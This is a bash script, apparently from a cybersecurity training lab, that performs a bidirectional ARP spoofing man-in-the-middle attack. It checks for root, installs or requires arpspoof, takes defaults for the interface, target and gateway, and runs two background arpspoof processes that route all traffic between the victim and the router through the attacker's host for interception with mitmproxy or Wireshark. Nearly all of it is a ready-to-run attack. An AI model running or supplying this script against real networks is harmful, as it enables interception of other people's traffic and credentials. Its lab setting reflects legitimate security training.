#!/bin/bash
# ==============================================================================
# Script: 02_arp_spoof_attack.sh
# Purpose: Execute bidirectional ARP cache poisoning (Target <-> Gateway)
# Lab: NTI Cybersecurity Training Lab - MITM via ARP Spoofing
# Researcher: Solo Security Researcher
# ==============================================================================
#
# INSTRUCTIONS:
# 1. Update the environment variables below with your lab parameters,
#    OR pass them as command-line arguments:
#    Usage: sudo ./02_arp_spoof_attack.sh [INTERFACE] [TARGET_IP] [GATEWAY_IP]
#
# 2. Make sure 01_setup_ip_forwarding.sh has been executed prior to running this.
#
# 3. This script poisons both:
#    a) Target's ARP cache: associates Gateway IP with Attacker's MAC
#    b) Gateway's ARP cache: associates Target IP with Attacker's MAC
# ==============================================================================

set -euo pipefail

# Check for root privilege
if [ "$EUID" -ne 0 ]; then
  echo "[-] Error: Please execute this script as root (sudo ./02_arp_spoof_attack.sh)"
  exit 1
fi

# Ensure arpspoof (dsniff package) is installed
if ! command -v arpspoof &> /dev/null; then
  echo "[-] Error: 'arpspoof' command not found."
  echo "    Install it on Kali/Debian using: sudo apt update && sudo apt install -y dsniff"
  exit 1
fi

# ==============================================================================
# CONFIGURATION PLACEHOLDERS - REPLACE THESE WITH YOUR ACTUAL LAB VALUES
# ==============================================================================
INTERFACE="${1:-eth0}"            # e.g., eth0, wlan0, ens33
TARGET_IP="${2:-192.168.1.100}"   # e.g., Target victim workstation IP
GATEWAY_IP="${3:-192.168.1.1}"    # e.g., Default gateway / router IP
# ==============================================================================

echo "=========================================================="
echo "    NTI MITM Lab: Bidirectional ARP Spoofing Attack       "
echo "=========================================================="
echo "[+] Network Interface : $INTERFACE"
echo "[+] Target Victim IP  : $TARGET_IP"
echo "[+] Default Gateway IP: $GATEWAY_IP"
echo "=========================================================="
echo "[!] NOTE: Press CTRL+C at any time to terminate attack."
echo "[!] arpspoof will automatically attempt to restore original ARP caches on exit."
echo "----------------------------------------------------------"

# Trap CTRL+C (SIGINT) to clean up background processes
cleanup() {
  echo -e "\n[*] Terminating ARP spoofing processes..."
  kill $(jobs -p) 2>/dev/null || true
  wait $(jobs -p) 2>/dev/null || true
  echo "[+] Cleaned up. ARP tables should be restored."
  exit 0
}
trap cleanup SIGINT SIGTERM

echo "[*] Step 1: Poisoning Target ($TARGET_IP) -> Claiming to be Gateway ($GATEWAY_IP)..."
arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY_IP" > /dev/null 2>&1 &
PID_TARGET=$!

echo "[*] Step 2: Poisoning Gateway ($GATEWAY_IP) -> Claiming to be Target ($TARGET_IP)..."
arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" "$TARGET_IP" > /dev/null 2>&1 &
PID_GATEWAY=$!

echo "[+] Bidirectional ARP Poisoning actively running in background (PIDs: $PID_TARGET, $PID_GATEWAY)."
echo "[+] All traffic between $TARGET_IP and $GATEWAY_IP is now flowing through this host."
echo "[*] Keep this window open and monitor traffic in another terminal using mitmproxy / Wireshark."

# Wait for background jobs
wait
